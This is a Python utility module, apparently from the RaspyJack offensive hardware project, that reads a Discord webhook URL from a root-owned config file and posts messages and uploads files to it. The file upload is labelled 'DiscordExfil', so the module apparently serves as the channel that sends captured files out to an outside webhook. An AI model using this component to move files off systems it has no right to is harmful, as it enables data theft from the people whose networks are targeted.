"""Discord webhook utilities shared between plugin and bin scripts."""
import os
import json
import requests
from datetime import datetime

def get_discord_webhook_url():
    """
    Read Discord webhook URL from configuration file.
    Ignores lines with '#' and only considers lines starting with the webhook URL pattern.
    """
    webhook_file = "/root/Raspyjack/discord_webhook.txt"
    try:
        if os.path.exists(webhook_file):
            with open(webhook_file, 'r') as f:
                for line in f:
                    # Ignore comments
                    if '#' in line:
                        continue
                    
                    # Clean up the line
                    webhook_url = line.strip()
                    
                    # Check if it's a valid webhook URL
                    if webhook_url.startswith("https://discord.com/api/webhooks/"):
                        print(f"[DiscordNotifier] Found webhook URL.")
                        return webhook_url
    except Exception as e:
        print(f"[DiscordNotifier] Error reading Discord webhook: {e}")
    return None

def send_message_to_discord(message: str, title: str = None, color: int = None):
    """
    Send a text message to Discord with optional embed formatting.
    
    Args:
        message: The message content to send
        title: Optional title for embed format
        color: Optional color for embed (hex int, e.g., 0xff0000 for red)
        
    Returns:
        bool: True if successful, False otherwise
    """
    webhook_url = get_discord_webhook_url()
    if not webhook_url:
        print("[DiscordMessage] No webhook configured.")
        return False
    
    try:
        if title or color is not None:
            # Send as embed
            embed = {
                "description": message,
                "timestamp": datetime.now().isoformat()
            }
            if title:
                embed["title"] = title
            if color is not None:
                embed["color"] = color
            
            payload = {"embeds": [embed]}
        else:
            # Send as simple message
            payload = {"content": message}
        
        response = requests.post(webhook_url, json=payload, timeout=10)
        
        if 200 <= response.status_code < 300:
            print("[DiscordMessage] Message sent successfully.")
            return True
        else:
            print(f"[DiscordMessage] Send failed: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        print(f"[DiscordMessage] Error sending message: {e}")
        return False

def send_file_to_discord(file_path: str, title: str = None, description: str = None):
    """
    Send a file to Discord with optional embed information.
    
    Args:
        file_path: Path to the file to upload
        title: Optional title for the embed
        description: Optional description for the embed
        
    Returns:
        bool: True if successful, False otherwise
    """
    webhook_url = get_discord_webhook_url()
    if not webhook_url:
        print("[DiscordExfil] No webhook configured.")
        return False
    
    try:
        if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
            print(f"[DiscordExfil] File is missing or empty: {file_path}")
            return False
        
        # Create embed if title or description provided
        payload_data = {}
        if title or description:
            embed = {
                "title": title or f"📎 File: {os.path.basename(file_path)}",
                "description": description or f"**File:** `{os.path.basename(file_path)}`\n**Size:** {os.path.getsize(file_path):,} bytes",
                "color": 0x0099ff,  # Blue color
                "footer": {"text": "RaspyJack File Exfil"},
                "timestamp": datetime.now().isoformat()
            }
            payload_data = {'embeds': [embed]}
        
        with open(file_path, 'rb') as f:
            if payload_data:
                data = {'payload_json': json.dumps(payload_data)}
                files = {'file': (os.path.basename(file_path), f, 'application/octet-stream')}
                response = requests.post(webhook_url, data=data, files=files, timeout=30)
            else:
                # Simple file upload without embed
                files = {'file': (os.path.basename(file_path), f, 'application/octet-stream')}
                response = requests.post(webhook_url, files=files, timeout=30)
        
        if 200 <= response.status_code < 300:
            print("[DiscordExfil] File sent successfully.")
            return True
        else:
            print(f"[DiscordExfil] Upload failed: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        print(f"[DiscordExfil] Error sending file: {e}")
        return False